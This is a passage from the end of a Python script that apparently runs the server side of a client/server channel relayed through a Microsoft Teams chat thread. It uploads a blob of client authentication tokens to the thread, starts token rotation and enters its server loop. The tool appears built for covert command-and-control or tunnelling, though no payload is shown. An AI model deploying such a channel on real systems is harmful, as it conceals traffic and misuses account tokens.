                print("  Launch the Client with:")
                print(f"    teams_client.exe -l {initial_blob_b64}")
                print()
                print("  (Server contact is embedded in the blob — no -c needed)")
                print("  On subsequent restarts (after crash), just run:")
                print(f"    teams_client.exe")
                print("  (The Client caches the blob in AppData after first run)")
                print("=" * 60)
                print()

                client_tokens_for_rotation = client_tokens
                try:
                    blob_msg = f"{BLOB_START}{initial_blob_b64}{BLOB_END}"
                    send_raw(thread_id, blob_msg, server_tokens, args.debug)
                except Exception:
                    pass

            except Exception as e:
                print(f"[-] Warning: Client login / token blob upload failed: {e}")
                print("    Token-only Client mode unavailable.")
                print("    Start the Client with -u/-p credentials instead.")
        else:
            print("[!] -uc/-pc not provided. Skipping token blob generation.")
            print("    Start the Client with:  python teams_client.py -u <email> -p <pass> -c ...")

        if client_tokens_for_rotation is not None:
            rot_thread = threading.Thread(
                target=token_rotation_loop,
                args=(client_tokens_for_rotation, thread_id, server_tokens, args.debug),
                daemon=True,
                name="TokenRotation",
            )
            rot_thread.start()
            print(f"[*] Token rotation started (every {TOKEN_ROTATION_INTERVAL}s)")
        else:
            print("[!] Token rotation disabled (no Client credentials provided).")

        server_loop(server_tokens, thread_id, debug=args.debug)

    except RuntimeError as e:
        print(f"\n[-] Error: {e}", file=sys.stderr)
        sys.exit(1)
    except requests.HTTPError as e:
        print(f"\n[-] HTTP Error: {e}", file=sys.stderr)
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
